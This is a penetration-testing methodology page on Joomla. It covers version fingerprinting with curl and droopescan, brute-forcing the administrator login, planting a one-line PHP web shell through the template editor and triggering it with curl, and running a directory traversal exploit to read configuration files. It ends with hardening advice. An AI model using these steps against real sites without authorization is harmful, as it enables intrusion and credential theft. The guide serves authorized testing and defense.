---
layout: page
title: "Joomla"
subtitle: "Fingerprinting Joomla, testing the admin login, and abusing template editing"
permalink: /methodology/common-apps/joomla/
---

Joomla is a PHP content management system with an administrator console at `/administrator`. Joomla sites are often fingerprinted from the HTML and default files, and the most common route to code execution is the built-in template editor, which lets an administrator change PHP source files. Known vulnerabilities are version-specific, so the version has to be confirmed before anything is attempted.

## 1. Discover and fingerprint

- The `generator` meta tag names Joomla. The `robots.txt` file lists directories such as `/administrator/`, `/cache/` and `/libraries/`.
- The version can be read from the installation files if they are present.

```bash
$ curl -s http://TARGET_URL/ | grep Joomla
$ curl -s http://TARGET_URL/README.txt | head -n 5
$ curl -s http://TARGET_URL/administrator/manifests/files/joomla.xml | xmllint --format -
```

The `plugins/system/cache/cache.xml` file gives an approximate version when the manifest is removed.

- Scanners such as droopescan and JoomlaScan can enumerate paths and version hints. Droopescan has limited Joomla support, so cross-check its output.

```bash
$ droopescan scan joomla --url http://TARGET_URL/
```

## 2. Enumerate and test the admin login

The administrator console is at `/administrator/index.php`. The login page usually gives a generic message for failed logins, which makes username enumeration unreliable. The default administrator username is `admin`, and the password is chosen during installation. Test a short list of common passwords, with lockout limits in mind.

```bash
$ python3 BRUTE_SCRIPT -u http://TARGET_URL -usr admin -w COMMON_PASSWORDS.txt
```

Leaked credentials from OSINT are often more productive than guessing. Test them against the administrator console on any Joomla instance in scope.

## 3. Abuse built-in functionality

With administrator access, the template editor can change the PHP of any template file. Use an existing template, choose a rarely used error or page file, and add a minimal command handler. Use a non-standard parameter name and restrict access to your address if the template allows it.

1. Open Templates under the configuration menu.
2. Select the active template and use the customise view.
3. Choose a file, such as an error page, and add the handler.

```php
<?php
system($_GET['SHELL_PARAM']);
?>
```

```bash
$ curl -s "http://TARGET_URL/templates/TEMPLATE_NAME/error.php?SHELL_PARAM=id"
```

Remove the handler once the proof of execution is recorded.

## 4. Check known issues

For version 3.9.4, the notes record a public directory traversal and authenticated file deletion issue. Its exploit runs with the administrator's credentials and can read files such as configuration files, which may hold database credentials.

```bash
$ python3 DIRECTORY_TRAVERSAL_SCRIPT --url "http://TARGET_URL/administrator/" --username USERNAME --password PASSWORD --dir /
```

> The file deletion capability of this issue is destructive. Use the read-only function where possible, and do not delete files on a production site.
{: .warning }

## Decision points

- Admin access confirmed: use the template editor for code execution.
- Version matches a known issue: confirm the traversal with a harmless read before extending it.
- No admin access: enumerate paths and test leaked or default credentials within the lockout policy.

## Defense

Keep Joomla and its extensions current, restrict the administrator console (for example, with an IP allow list or a secret login path), require strong passwords and two-factor authentication, and limit who can edit templates. See [Application Hardening](/methodology/common-apps/prevention/).
